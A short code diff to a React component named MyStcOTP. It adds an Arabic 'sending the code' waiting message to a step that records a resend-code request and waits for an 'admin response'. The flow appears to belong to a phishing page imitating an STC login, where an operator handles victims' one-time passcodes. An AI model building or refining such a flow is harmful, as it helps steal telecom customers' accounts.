@@ -93,6 +93,7 @@ export default function MyStcOTP() {
       data: { طلب: "إعادة إرسال رمز" },
       current: "MyStc OTP",
       waitingForAdminResponse: true,
+      customWaitingMessage: "جاري إرسال الرمز",
     });
   };
 
